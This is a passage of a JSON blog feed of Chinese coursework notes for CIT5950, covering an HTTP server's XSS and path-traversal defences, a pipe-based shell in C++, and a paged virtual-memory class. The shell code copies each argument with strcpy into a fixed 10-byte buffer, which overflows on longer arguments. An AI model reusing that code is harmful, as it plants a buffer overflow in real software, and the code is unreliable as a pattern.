操作)</li>\n</ul>\n<h3 id=\"HttpUtils-cc\"><a href=\"#HttpUtils-cc\" class=\"headerlink\" title=\"HttpUtils.cc\"></a><code>HttpUtils.cc</code></h3><p>主要负责一些其他功能，尤其是安全方面：</p>\n<ul>\n<li><code>escape_html</code><ul>\n<li>用于防止<code>cross-site scripting</code>，参考<span class=\"exturl\" data-url=\"aHR0cDovL2VuLndpa2lwZWRpYS5vcmcvd2lraS9Dcm9zcy1zaXRlX3NjcmlwdGluZw==\">Cross-site scripting</span></li>\n</ul>\n</li>\n<li><code>in_path_safe</code><ul>\n<li>保证使用该服务器的人只能获取到对应目录下的文件，其他目录下对他不开放权限</li>\n<li>否则可能会有攻击者使用<code>directory traverse attack</code></li>\n</ul>\n</li>\n</ul>\n<h2 id=\"Part-C\"><a href=\"#Part-C\" class=\"headerlink\" title=\"Part C\"></a>Part C</h2><ul>\n<li><code>HttpServer_ThrFn</code>函数实现<ul>\n<li>每个线程可以获取到一个连接</li>\n</ul>\n</li>\n<li>两个<code>helper_function</code><ul>\n<li>分别处理两种类型的请求<ul>\n<li>对查看文件的请求(<code>ProcessFileRequest</code>)</li>\n<li>执行查询的请求(<code>ProcessQueryRequest</code>)</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>使用<code>htttp</code>测试<code>Http Server</code>。输入命令<code>./httpd 3000 ./test_tree/</code>，在显示<code>accepting connections...</code>后，点击下方的<code>Open Server on port 3000</code></li>\n</ul>\n<h2 id=\"实现步骤\"><a href=\"#实现步骤\" class=\"headerlink\" title=\"实现步骤\"></a>实现步骤</h2><ol>\n<li><code>FileReader::read_file</code></li>\n<li><code>WordIndex.cc &amp; WordIndex.h</code></li>\n<li><code>CrawlFileTree.cc handle_file函数</code></li>\n<li><code>ServerSocket.cc</code></li>\n<li><code>get_request &amp; parse_request from HttpConnection.cc</code></li>\n<li><code>write_response in HttpConnection.cc</code></li>\n<li><code>HttpUtils.cc</code>两个函数实现</li>\n<li>test_suite 通过</li>\n<li>valgrind 通过</li>\n<li><code>HttpServer.cc</code>实现并测试</li>\n</ol>\n<h2 id=\"实现提示\"><a href=\"#实现提示\" class=\"headerlink\" title=\"实现提示\"></a>实现提示</h2><ul>\n<li><code>boost</code>库中的<code>split()/trim()/replace_all()</code>函数可以使用，使用<code>split()</code>时可以使用<code>is_any_of()/isalpha()/</code></li>\n<li>实现<code>ServerSocket.cc</code>时，留意<code>server_accept_rw_close</code></li>\n<li>有个小函数可以让<code>is_path_safe</code>的实现更简单(留意<code>HttpUtils.cc</code>中的注释，自己上网学习它的用法)</li>\n<li><code>FileReader</code>需要处理只含有 0 个字节的<code>binary_files</code>，这里可以使用传入 2 个参数的<code>string</code>构造函数</li>\n</ul>\n<h2 id=\"测试\"><a href=\"#测试\" class=\"headerlink\" title=\"测试\"></a>测试</h2><pre><code class=\"bash\">make\n./test_suite\nvalgrind ./test_suite\n</code></pre>\n",
            "tags": []
        },
        {
            "id": "https://salvely.github.io/blog/2024/01/06/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/CIT5950/CIT5950_HW4/",
            "url": "https://salvely.github.io/blog/2024/01/06/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/CIT5950/CIT5950_HW4/",
            "title": "HW4: Shell & Pipe 实现记录",
            "date_published": "2024-01-06T06:49:15.000Z",
            "content_html": "<h1 id=\"要求\"><a href=\"#要求\" class=\"headerlink\" title=\"要求\"></a>要求</h1><p>实现一个只含有基本命令和 Pipe(不含重定向符及其他符号)的 Shell。</p>\n<h1 id=\"指南\"><a href=\"#指南\" class=\"headerlink\" title=\"指南\"></a>指南</h1><h2 id=\"相关文件\"><a href=\"#相关文件\" class=\"headerlink\" title=\"相关文件\"></a>相关文件</h2><ul>\n<li><code>pipe_shell.cc</code>:在其中实现 shell 程序</li>\n<li><code>sh.cc</code>: 传入一个附带参数的程序，<code>fork()</code>子程序然后<code>execvp()</code>去执行它</li>\n<li><code>stdin_echo.cc</code>: 从<code>stdin</code>中读取，输出读取的内容，直到获取<code>EOF</code>，然后停止</li>\n<li><code>example_tests/</code>: 其中含有示例输入和对应输出</li>\n<li><code>solution_binaries/</code>: 官方答案执行码</li>\n</ul>\n<h2 id=\"具体要求\"><a href=\"#具体要求\" class=\"headerlink\" title=\"具体要求\"></a>具体要求</h2><ul>\n<li>程序一次从标准输入读取一行命令</li>\n<li>一行命令包括命令本身和连接他们的 Pipe</li>\n<li>不停读入直到读入<code>EOF</code>&#x2F;用户输入<code>exit</code></li>\n<li>在当前命令完成之后才能运行下一条命令</li>\n<li>命令可以是绝对路径或者是程序名（用<code>execvp</code>执行）</li>\n</ul>\n<h2 id=\"建议方法\"><a href=\"#建议方法\" class=\"headerlink\" title=\"建议方法\"></a>建议方法</h2><ul>\n<li>通读该指南和提供的源代码，搞清楚作业是在做什么</li>\n<li>执行一下<code>./solution_binaries/pipe_shell</code>，看看结果长什么样</li>\n<li>开始实现<code>pipe_shell.cc</code>，从循环提示用户输入开始，并且打印<code>$</code>提示符，直到无输入或者遇到<code>EOF</code>&#x2F;输入<code>exit</code></li>\n<li>实现<code>fork()</code>，<code>pipe</code>连接和命令的执行(<code>execvp</code>或者直接运行命令路径)</li>\n</ul>\n<h2 id=\"实现提示\"><a href=\"#实现提示\" class=\"headerlink\" title=\"实现提示\"></a>实现提示</h2><ul>\n<li>可以使用<code>boost</code>库中的<code>split()</code>和<code>trim()</code>方法，</li>\n<li>使用<code>execvp(), fork(), pipe(), waitpid()</code>等函数</li>\n<li>注意不同情形：无管道，一个管道，多于一个管道</li>\n<li>两种方法<ul>\n<li>使用一个 pipe 数组</li>\n<li>每次<code>fork()</code>之前创建一个<code>pipe</code></li>\n</ul>\n</li>\n<li>每个子进程只需要两个端口，从上一个进程送来的读端口，和给下一个子进程的写端口</li>\n<li>子进程用完端口之后关闭端口，否则程序无法正常退出</li>\n</ul>\n<h2 id=\"测试\"><a href=\"#测试\" class=\"headerlink\" title=\"测试\"></a>测试</h2><ul>\n<li>普通测试: <code>make &amp;&amp; ./pipe_shell</code></li>\n<li>内存泄漏测试: <code>valgrind --leak-check=full ./pipe_shell</code></li>\n<li>比较自己的程序和<code>solution_binaries/pipe_shell</code>的结果：</li>\n</ul>\n<pre><code class=\"bash\">cat ./tests/simple_input.txt | ./pipe_shell &amp;&gt; my_output.txt\ndiff my_output.txt ./tests/simple_output.txt\n</code></pre>\n<h2 id=\"pipe-shell-cc\"><a href=\"#pipe-shell-cc\" class=\"headerlink\" title=\"pipe_shell.cc\"></a><code>pipe_shell.cc</code></h2><blockquote>\n<p>实现核心：<code>pipe</code>的内存在操作系统内核中。在每次循环前创建一个<code>pipe</code>，然后<code>fork()</code>一个子进程读取上一个<code>pipe</code>的内容，写入当前这个<code>pipe</code>。使用完毕后关闭这个<code>pipe</code>的写端，保留这个<code>pipe</code>的读端口。进而让下一次<code>dup2</code>导入时使用，使用完后可关闭该<code>pipe</code>的读端口。<code>pipe</code>不会像本地变量那样随着循环的进行而消失，只要保存一下读&#x2F;写端口，在下一轮循环中就可以正常的进行读写。<br>此外，我们使用<code>dup2</code>来进行端口的重定向。</p>\n</blockquote>\n<pre><code class=\"cpp\">#include &lt;unistd.h&gt;    // for fork()\n#include &lt;sys/types.h&gt; // for pid_t\n#include &lt;sys/wait.h&gt;  // for wait(), waitpid(), etc.\n\n#include &lt;cstdlib&gt; // for exit(), EXIT_SUCCESS, and EXIT_FAILURE\n#include &lt;iostream&gt;\n#include &lt;vector&gt;\n#include &lt;string.h&gt;\n#include &lt;boost/algorithm/string.hpp&gt;\n\nusing namespace std;\n\n#define BUF_SIZ 1000\n\nint main()\n&#123;\n    string s;\n    cout &lt;&lt; &quot;$ &quot;;\n    while (getline(std::cin, s))\n    &#123;\n        if (s == &quot;exit&quot;)\n        &#123;\n            return EXIT_SUCCESS;\n        &#125;\n\n        int fd[2];\n        int in_fd = 0; // input fd\n\n        // split the command into multiple parts\n        vector&lt;string&gt; tokens;\n        boost::algorithm::split(tokens, s, boost::is_any_of(&quot;|&quot;), boost::token_compress_on);\n\n        int count = 1;\n        int command_num = tokens.size();\n\n        for (auto &amp;command : tokens)\n        &#123;\n            // initialize a pipe\n            if (pipe(fd) == -1)\n            &#123;\n                perror(&quot;pipe creation failed!&quot;);\n                return EXIT_FAILURE;\n            &#125;\n\n            // prepare to run the current command\n\n            // get the current command\n            boost::algorithm::trim(command);\n            // split the command into an array of args\n            vector&lt;string&gt; args;\n            boost::algorithm::split(args, command, boost::is_any_of(&quot; &quot;), boost::token_compress_on);\n            int argc = args.size();\n            if (argc &lt; 1)\n            &#123;\n                cerr &lt;&lt; &quot;We need a command!&quot; &lt;&lt; endl;\n                return EXIT_FAILURE;\n            &#125;\n\n            // run the current command\n            pid_t child = fork();\n            if (child == 0)\n            &#123;\n                // setup the file name and input arguments\n                const char *filename = args[0].c_str();\n                char **argv = new char *[argc + 1];\n                for (int i = 0; i &lt; argc; i++)\n                &#123;\n                    string args_str = args[i];\n                    argv[i] = new char[10];\n                    strcpy(argv[i], args_str.c_str());\n                &#125;\n                argv[argc] = nullptr;\n\n                if (in_fd != 0)\n                &#123;\n                    // write the pipe value into stdin\n                    dup2(in_fd, STDIN_FILENO);\n                    close(in_fd);\n                &#125;\n\n                if (count != command_num)\n                &#123;\n                    // write stdout to the pipe\n                    dup2(fd[1], STDOUT_FILENO);\n                    close(fd[1]);\n                &#125;\n\n                // use execvp() to run the commmand\n                execvp(filename, argv);\n\n                // exec didn&#39;t work, so an error must have been occurred\n                cerr &lt;&lt; strerror(errno) &lt;&lt; endl;\n                delete[] argv;\n                return EXIT_FAILURE;\n            &#125;\n\n            // wait for the child process to complete\n            int status;\n            waitpid(child, &amp;status, 0);\n\n            // close the current pipe write fd\n            close(fd[1]);\n            in_fd = fd[0];\n            count += 1;\n        &#125;\n\n        // // read out the pipe\n        // char buffer[BUF_SIZ];\n        // int count = read(in_fd, buffer, BUF_SIZ);\n        // buffer[count] = &#39;\\0&#39;;\n        // if (count &gt; 0)\n        // &#123;\n        //     fprintf(stdout, &quot;%s&quot;, buffer);\n        // &#125;\n        close(in_fd);\n\n        cout &lt;&lt; &quot;$ &quot;;\n    &#125;\n    return EXIT_SUCCESS;\n&#125;\n</code></pre>\n",
            "tags": []
        },
        {
            "id": "https://salvely.github.io/blog/2024/01/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/CIT5950/CIT5950_HW3/",
            "url": "https://salvely.github.io/blog/2024/01/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/CIT5950/CIT5950_HW3/",
            "title": "HW3: LRU SimpleVM 实现记录",
            "date_published": "2024-01-04T05:27:01.000Z",
            "content_html": "<h1 id=\"Overview\"><a href=\"#Overview\" class=\"headerlink\" title=\"Overview\"></a>Overview</h1><p>本作业要求实现:</p>\n<ul>\n<li>Page 对象：<ul>\n<li>若 Page 不在 memory 中，那么它的数据被存储在磁盘上的<code>swap file</code>部分。在<code>swap file</code>中，每一页都有对应的顺序存储的数据。</li>\n<li>可以使用 C++ <code>fstream</code>类进行 I&#x2F;O 读写。尤其是<code>read()</code>和<code>write()</code>方法。</li>\n</ul>\n</li>\n<li>PageTable 对象<ul>\n<li>包含多个 page 以及<code>swap file</code></li>\n<li>这里主要要求实现 LRU 算法</li>\n</ul>\n</li>\n</ul>\n<h1 id=\"相关文件\"><a href=\"#相关文件\" class=\"headerlink\" title=\"相关文件\"></a>相关文件</h1><h2 id=\"Page\"><a href=\"#Page\" class=\"headerlink\" title=\"Page\"></a>Page</h2><ul>\n<li><code>Page.h</code></li>\n<li><code>Page.cc</code></li>\n<li><code>PageTemplates.cc</code></li>\n</ul>\n<h2 id=\"PageTable\"><a href=\"#PageTable\" class=\"headerlink\" title=\"PageTable\"></a>PageTable</h2><ul>\n<li><code>PageTable.h</code></li>\n<li><code>PageTable.cc</code></li>\n</ul>\n<h2 id=\"Testing\"><a href=\"#Testing\" class=\"headerlink\" title=\"Testing\"></a>Testing</h2><ul>\n<li><code>test_page.cc</code></li>\n<li><code>test_pagetable.cc</code></li>\n</ul>\n<h1 id=\"实现提示\"><a href=\"#实现提示\" class=\"headerlink\" title=\"实现提示\"></a>实现提示</h1><ul>\n<li>map, unordered_map, list, vector 结构都很有用</li>\n<li><code>fstream</code>中的<code>read()</code>和<code>write()</code>很有用</li>\n<li>需要将<code>uint8_t</code>切换到<code>char</code>类型来使用<code>fstream</code></li>\n<li>利用初始化列表来初始化引用类型</li>\n</ul>\n<h1 id=\"Page实现\"><a href=\"#Page实现\" class=\"headerlink\" title=\"Page实现\"></a>Page实现</h1><h2 id=\"Page-源码分析\"><a href=\"#Page-源码分析\" class=\"headerlink\" title=\"Page 源码分析\"></a>Page 源码分析</h2><p><code>simplevm namespace</code>中存在一个类<code>Page</code>，此外还有一个<code>uint32_t</code>类型(<code>pno_t</code>类型)的变量，用来表示页号。<code>Page</code>页的解释如下:</p>\n<ul>\n<li>页对象存在-&gt;页被导入到 physical memory-&gt;创建一个<code>page</code>，并且从<code>swap_file</code>中读<code>page</code>数据。页的数据从<code>virtual_pno * Page::PAGE_SIZE</code>开始</li>\n<li>页对象不存在-&gt;数据存储在<code>swap_file</code>中</li>\n<li>用户可以<ul>\n<li>获取数据</li>\n<li>存储数据</li>\n<li>将数据刷新到<code>swap file</code>中（多余的无法放入 physical memory 的虚拟内存所存储的地方）</li>\n</ul>\n</li>\n</ul>\n<p><code>Page</code>类中包含如下<code>public</code>方法:</p>\n<ul>\n<li><code>Page(fstream&amp; swap_file, pno_t virtual_pno);</code><ul>\n<li>构造函数，传入该<code>page</code>对应的<code>swap_file</code>和页号</li>\n<li>我们从<code>swap_file</code>读入页数据，刷新时将页数据写入<code>swap_file</code></li>\n<li>页号规定了我们在<code>swap_file</code>的哪里写入数据</li>\n</ul>\n</li>\n<li><code>Page(const Page&amp; other);</code><ul>\n<li>利用一个页来复制构造另一个页，两个页具有相同的页号和<code>swap_file</code>地址，但是数据是复制了的（不是引用）</li>\n</ul>\n</li>\n<li><code>~Page()</code><ul>\n<li>清理声明的变量</li>\n<li>如果当前数据为 dirty 状态，那么将其刷新到对应的<code>swap_file</code></li>\n</ul>\n</li>\n<li><code>Page&amp; operator=(const Page&amp; rhs)</code><ul>\n<li>赋值函数，同复制构造函数，两个<code>Page</code>具有相同的<code>swap_file</code>和页号，但是<code>data</code>是被复制了的</li>\n</ul>\n</li>\n<li><code>template &lt;typename T&gt; T access(uint32_t virtual_address);</code><ul>\n<li>获取该页面的值（需要考虑错误情况）</li>\n</ul>\n</li>\n<li><code>T store(uint32_t virtual address, const T&amp; to_write)</code><ul>\n<li>存储值到该页面中去</li>\n</ul>\n</li>\n<li><code>bool operator&lt;(const Page&amp; rhs);</code><ul>\n<li>比较两个页面顺序</li>\n</ul>\n</li>\n<li><code>pno_t pno();</code><ul>\n<li>获取该页面的页号</li>\n</ul>\n</li>\n<li><code>bool dirty();</code><ul>\n<li>该 page 是否为 dirty 状态(如果有人在 flush 之后，向该 page 写过值就是 dirty)</li>\n</ul>\n</li>\n<li><code>void flush();</code><ul>\n<li>如果该 page 是 dirty 状态，就把内容刷新到<code>swap_file</code></li>\n</ul>\n</li>\n<li>变量：<code>static constexpr size_t PAGE_SIZE = 4096U;</code><ul>\n<li>该 page 的大小</li>\n</ul>\n</li>\n</ul>\n<p>Page 中还包括如下<code>private</code>变量:</p>\n<ul>\n<li><code>fstream&amp; swap_file_;</code><ul>\n<li>注意这里是个引用，一个 page 没有对<code>swap_file</code>的所有权，只能 access 到它，所以这里<code>swap_file</code>是个引用</li>\n</ul>\n</li>\n<li><code>pno_t virtual_pno_;</code><ul>\n<li>该 page 的页号</li>\n</ul>\n</li>\n<li><code>uint8_t *bytes_;</code><ul>\n<li>该 page 的字节内容</li>\n</ul>\n</li>\n<li><code>bool dirty_;</code><ul>\n<li>该 page 是否在 flush 后被写入</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"Page-设计\"><a href=\"#Page-设计\" class=\"headerlink\" title=\"Page 设计\"></a>Page 设计</h2><h2 id=\"PageTemplates-cc实现\"><a href=\"#PageTemplates-cc实现\" class=\"headerlink\" title=\"PageTemplates.cc实现\"></a><code>PageTemplates.cc</code>实现</h2><p><code>PageTemplates.cc</code>在<code>simplevm namespace</code>中。源码如下:</p>\n<pre><code class=\"cpp\">\nnamespace simplevm &#123;\n  // TODO: implement all template member functions for Page\n\n  // This function allows users to read various data types\n  // from the page. Trying to read a non-primitive type or use\n  // a virtual address that doesn&#39;t map to this page results\n  // in undefined behaviour. You can also assume that\n  // anything being read fits in on the page we are reading\n  // is not partially on another page.\n  // If you are familiar with endianness, it shouldn&#39;t be\n  // considered for this function.\n  //\n  // Arguments:\n  //   - virtual_address: a virtual address that maps somewhere\n  //     into the page, where we will read data of type T\n  //\n  // Returns:\n  //   - the data of type T that was read from the page\n  template &lt;typename T&gt;\n  T Page::access(uint32_t virtual_address) &#123;\n    if(virtual_address / PAGE_SIZE != virtual_pno_)\n        return 0;\n    virtual_address = virtual_address % PAGE_SIZE;\n    T* address = (T*)(bytes_ + virtual_address);\n    return *address;\n  &#125;\n\n  // This function allows users to write various data types\n  // to the page. Trying to write a non-primitive type or use\n  // a virtual address that doesn&#39;t map to this page results\n  // in undefined behaviour. You can also assume that\n  // anything being written fits on the current page\n  // is not partially on another page.\n  // If you are familiar with endianness, it shouldn&#39;t be\n  // considered for this function.\n  //\n  // Arguments:\n  //   - virtual_address: a virtual address that maps somewhere\n  //     into the page, where we will read data of type T\n  //   - to_write: the data of type T to write to the page\n  //\n  // Returns: nothing\n\n  template &lt;typename T&gt;\n  void Page::store(uint32_t virtual_address, const T&amp; to_write) &#123;\n    if(virtual_address / PAGE_SIZE != virtual_pno_)\n        return;\n    virtual_address = virtual_address % PAGE_SIZE;\n    T* address = (T*)(bytes_ + virtual_address);\n    *address = to_write;\n    dirty_ = true;\n  &#125;\n&#125;\n</code></pre>\n<h2 id=\"Page-h定义\"><a href=\"#Page-h定义\" class=\"headerlink\" title=\"Page.h定义\"></a><code>Page.h</code>定义</h2><p><code>Page.h</code>在<code>simplevm namespace</code>中。源码如下:</p>\n<pre><code class=\"cpp\">#ifndef PAGE_H_\n#define PAGE_H_\n\n#include &lt;cstdint&gt;\n#include &lt;fstream&gt;\n\nusing std::fstream;\n\nnamespace simplevm &#123;\n\n// defines the type pno_t, which is the type\n// that represents a page number\ntypedef uint32_t pno_t;\n\n///////////////////////////////////////////////////////////////////////////////\n// A Page is a class that represents a page of memory\n// in our simple virtual memory model.\n// If a page object exists, then we say that the page is loaded\n// into physical memory. When the page object doesn&#39;t exist, then its\n// data is stored in the swap_file. When we load in a page to\n// &quot;physical memory&quot;, we are creating the page and we read the page&#39;s data\n// from the swap file. A page&#39;s data in the swap file starts at\n// virtual_pno * Page::PAGE_SIZE\n//\n// This Class manages a page&#39;s worth of data\n// Users can access or store data, sa well as flush the data in the\n// page to the specified swap file. A swap file is where exceess virtual\n// memory is stored when it can&#39;t fit in physical memory.\n///////////////////////////////////////////////////////////////////////////////\nclass Page &#123;\n public:\n  // Constructs a new Page object associated\n  // with a swap_file and a virtual page number.\n  // The swap file is where we will load in the page\n  // contents and flush the page contents. The virtual\n  // page number decides where in that file we read\n  // and write this page.\n  // Passing in an invalid page number is undefined behaviour\n  // Note that a Page does not have ownership\n  // of the swap_file_, just access to it.\n  //\n  // Arguments:\n  //  - swap_file the swap_file associated with the page\n  //  - the virtual page number of our new page\n  Page(fstream&amp; swap_file, pno_t virtual_pno);\n\n  // Constructs a new Page object that is a copy of\n  // another page object. Both pages will have\n  // the same page number and swap_file, but should\n  // have independent copies of the page data.\n  //\n  // Misc: this means that there could be issues with\n  // having the original and copy page having differnt\n  // data. This cctor should only really be used\n  // in the context of managing pages with something\n  // like STL, where the original page used for the cctor\n  // will be discarded. In real C++, we would want to\n  // use move semantics here.\n  //\n  // Arguements:\n  //   - other: the page we are copying\n  Page(const Page&amp; other);\n\n  // Destructor for the page object\n  // Cleans up any dynamically allocated data or\n  // otherwise allocated resources AND should flush\n  // its contents if the page is dirty at time of\n  // destruction.\n  ~Page();\n\n  // Set the current Page object so that is a copy of\n  // another page object. Both pages will have\n  // the same page number and swap_file, but should\n  // have independent copies of the page data.\n  //\n  // Misc: this means that there could be issues with\n  // having the original and copy page having differnt\n  // data. This op= should only really be used\n  // in the context of managing pages with something\n  // like STL, where the original page used for the cctor\n  // will be discarded. In real C++, we would want to\n  // use move semantics here.\n  //\n  // You can assume each page has the same swap_file.\n  //\n  // Arguements:\n  //   - rhs: the page we are copying\n  Page&amp; operator=(const Page&amp; rhs);\n\n  // This function is not required, but you may add it\n  // if it is needed for some of the STL containers\n  // you use in PageTable\n  //\n  // Determines if this page should go before another page if they\n  // were in sorted order.\n  //\n  // Arguments:\n  //   - rhs: the Page we are comparing this to\n  //\n  // Returns: true iff this page would show up before the other\n  // page in sorted order. False otherwise.\n  bool operator&lt;(const Page&amp; rhs);\n\n  // This function allows users to read various data types\n  // from the page. Trying to read a non-primitive type or use\n  // a virtual address that doesn&#39;t map to this page results\n  // in undefined behaviour. You can also assume that\n  // anything being read fits in on the page we are reading\n  // is not partially on another page.\n  // If you are familiar with endianness, it shouldn&#39;t be\n  // considered for this function.\n  //\n  // Arguments:\n  //   - virtual_address: a virtual address that maps somewhere\n  //     into the page, where we will read data of type T\n  //\n  // Returns:\n  //   - the data of type T that was read from the page\n  template &lt;typename T&gt;\n  T access(uint32_t virtual_address);\n\n  // This function allows users to write various data types\n  // to the page. Trying to write a non-primitive type or use\n  // a virtual address that doesn&#39;t map to this page results\n  // in undefined behaviour. You can also assume that\n  // anything being written fits on the current page\n  // is not partially on another page.\n  // If you are familiar with endianness, it shouldn&#39;t be\n  // considered for this function.\n  //\n  // Arguments:\n  //   - virtual_address: a virtual address that maps somewhere\n  //     into the page, where we will read data of type T\n  //   - to_write: the data of type T to write to the page\n  //\n  // Returns: nothing\n  template &lt;typename T&gt;\n  void store(uint32_t virtual_address, const T&amp; to_write);\n\n  // Returns the virtual page number of this page\n  //\n  // Arguments: None\n  //\n  // Returns: this page&#39;s virtual page number\n  pno_t pno();\n\n  // Returns whether or not a page is dirty\n  // A page is &quot;dirty&quot; if someone has written to the data managed\n  // by the page since the last time the page was flush()&#39;d.\n  //\n  // Arguments: None\n  //\n  // Returns: Whether this page is dirty or not\n  bool dirty();\n\n  // Flushes the page to the swap file if it is dirty.\n  // Flushing a page to the swap file involves writing\n  // the page at the the spot correspoding to its page number\n  // in the swap_file. For a description of what it means\n  // for a page to be dirty, see the dirty() member function.\n  // The page should not be written if it is not dirty.\n  //\n  // Arguments: None\n  //\n  // Returns: Nothing\n  void flush();\n\n  // The amount of memory a page represents\n  static constexpr size_t PAGE_SIZE = 4096U;\n\n private:\n  // The file we will be reading/writing to\n  // Note how this is a reference\n  //\n  // also note that a Page does not have ownership\n  // of the swap_file_, just access to it.\n  fstream&amp; swap_file_;\n\n  // the virtual page number\n  pno_t virtual_pno_;\n\n  // The bytes of the page. One byte is 8 bits\n  // so we use 8-bit unsigned integers.\n  // You can also assume that a &#39;char&#39; is one byte big\n  uint8_t *bytes_;\n\n  // Whether the page is dirty or not\n  bool dirty_;\n&#125;;\n\n&#125;\n\n// since we have template code\n#include &quot;./PageTemplates.cc&quot;\n\n#endif  // PAGE_H_\n</code></pre>\n<h2 id=\"Page-cc实现\"><a href=\"#Page-cc实现\" class=\"headerlink\" title=\"Page.cc实现\"></a><code>Page.cc</code>实现</h2><p><code>Page.cc</code>在<code>simplevm namespace</code>中。源码如下:</p>\n<pre><code class=\"cpp\">#include &quot;./Page.h&quot;\n#include &lt;fstream&gt;\n#include &lt;iostream&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n\nnamespace simplevm &#123;\n  // TODO: implement all non template member functions for Page\n    // Constructs a new Page object associated\n  // with a swap_file and a virtual page number.\n  // The swap file is where we will load in the page\n  // contents and flush the page contents. The virtual\n  // page number decides where in that file we read\n  // and write this page.\n  // Passing in an invalid page number is undefined behaviour\n  // Note that a Page does not have ownership\n  // of the swap_file_, just access to it.\n  //\n  // Arguments:\n  //  - swap_file the swap_file associated with the page\n  //  - the virtual page number of our new page\n  Page::Page(fstream&amp; swap_file, pno_t virtual_pno):swap_file_(swap_file) &#123;\n    this-&gt;virtual_pno_ = virtual_pno;\n    this-&gt;bytes_ = new uint8_t[PAGE_SIZE];\n    // seek the correct position\n    swap_file_.seekg(virtual_pno_ * PAGE_SIZE, std::ios::beg);\n    // read from the swap file\n    swap_file_.read((char*)bytes_,PAGE_SIZE);\n    if(!swap_file_) &#123;\n        std::cerr &lt;&lt; &quot;Swap file read failed!&quot; &lt;&lt; std::endl;\n        exit(1);\n    &#125;\n    this-&gt;dirty_ = false;\n  &#125;\n\n  // Constructs a new Page object that is a copy of\n  // another page object. Both pages will have\n  // the same page number and swap_file, but should\n  // have independent copies of the page data.\n  //\n  // Misc: this means that there could be issues with\n  // having the original and copy page having differnt\n  // data. This cctor should only really be used\n  // in the context of managing pages with something\n  // like STL, where the original page used for the cctor\n  // will be discarded. In real C++, we would want to\n  // use move semantics here.\n  //\n  // Arguements:\n  //   - other: the page we are copying\n  Page::Page(const Page&amp; other):swap_file_(other.swap_file_) &#123;\n    this-&gt;virtual_pno_ = other.virtual_pno_;\n    this-&gt;bytes_ = new uint8_t[PAGE_SIZE];\n    memcpy(this-&gt;bytes_,other.bytes_,PAGE_SIZE);\n    this-&gt;dirty_ = other.dirty_;\n  &#125;\n\n  // Destructor for the page object\n  // Cleans up any dynamically allocated data or\n  // otherwise allocated resources AND should flush\n  // its contents if the page is dirty at time of\n  // destruction.\n  Page::~Page() &#123;\n    if(dirty_) &#123;\n        flush();\n    &#125;\n    dirty_ = false;\n    delete[] bytes_;\n  &#125;\n\n  // Set the current Page object so that is a copy of\n  // another page object. Both pages will have\n  // the same page number and swap_file, but should\n  // have independent copies of the page data.\n  //\n  // Misc: this means that there could be issues with\n  // having the original and copy page having differnt\n  // data. This op= should only really be used\n  // in the context of managing pages with something\n  // like STL, where the original page used for the cctor\n  // will be discarded. In real C++, we would want to\n  // use move semantics here.\n  //\n  // You can assume each page has the same swap_file.\n  //\n  // Arguements:\n  //   - rhs: the page we are copying\n  Page&amp; Page::operator=(const Page&amp; rhs) &#123;\n    if (this!=&amp;rhs)\n    &#123;\n        this-&gt;~Page();\n        new (this)Page(rhs);\n    &#125;\n\n    return *this;\n  &#125;\n\n  // This function is not required, but you may add it\n  // if it is needed for some of the STL containers\n  // you use in PageTable\n  //\n  // Determines if this page should go before another page if they\n  // were in sorted order.\n  //\n  // Arguments:\n  //   - rhs: the Page we are comparing this to\n  //\n  // Returns: true iff this page would show up before the other\n  // page in sorted order. False otherwise.\n  bool Page::operator&lt;(const Page&amp; rhs) &#123;\n    return this-&gt;virtual_pno_ &lt; rhs.virtual_pno_;\n  &#125;\n\n  // Returns the virtual page number of this page\n  //\n  // Arguments: None\n  //\n  // Returns: this page&#39;s virtual page number\n  pno_t Page::pno() &#123;\n    return this-&gt;virtual_pno_;\n  &#125;\n\n  // Returns whether or not a page is dirty\n  // A page is &quot;dirty&quot; if someone has written to the data managed\n  // by the page since the last time the page was flush()&#39;d.\n  //\n  // Arguments: None\n  //\n  // Returns: Whether this page is dirty or not\n  bool Page::dirty() &#123;\n    return this-&gt;dirty_;\n  &#125;\n\n  // Flushes the page to the swap file if it is dirty.\n  // Flushing a page to the swap file involves writing\n  // the page at the the spot correspoding to its page number\n  // in the swap_file. For a description of what it means\n  // for a page to be dirty, see the dirty() member function.\n  // The page should not be written if it is not dirty.\n  //\n  // Arguments: None\n  //\n  // Returns: Nothing\n  void Page::flush() &#123;\n    if(dirty()) &#123;\n        // seek the correct position\n        swap_file_.seekg(virtual_pno_ * PAGE_SIZE,std::ios::beg);\n        // write to the swap file\n        swap_file_.write((char*)bytes_,PAGE_SIZE);\n        if(!swap_file_) &#123;\n            std::cerr &lt;&lt; &quot;Swap file write failed!&quot; &lt;&lt; std::endl;\n            exit(1);\n        &#125;\n        dirty_ = false;\n    &#125;\n  &#125;\n&#125;\n</code></pre>\n<h1 id=\"PageTable实现\"><a href=\"#PageTable实现\" class=\"headerlink\" title=\"PageTable实现\"></a>PageTable实现</h1><h2 id=\"PageTable-源码分析\"><a href=\"#PageTable-源码分析\" class=\"headerlink\" title=\"PageTable 源码分析\"></a>PageTable 源码分析</h2><p>PageTable 的作用如下：</p>\n<ul>\n<li>管理一个进程的地址空间</li>\n<li>包括<code>swap_file</code></li>\n<li>从 physical memory 中读取页</li>\n<li>选择页淘汰，进行页替换</li>\n</ul>\n<p><code>PageTable.cc</code>中有如下一些方法：</p>\n<ul>\n<li><code>PageTable(std::string swap_file_name, size_t page_capacity);</code><ul>\n<li>初始化页表，制定<code>swap_file</code>名称和页容量</li>\n<li>存储的页不可超过页容量</li>\n</ul>\n</li>\n<li><code>~PageTable();</code><ul>\n<li>清理所有变量</li>\n<li>flush dirty pages</li>\n</ul>\n</li>\n<li><code>Page&amp; get_page(uint32_t virtual_address);</code><ul>\n<li>返回一个虚拟地址对应的 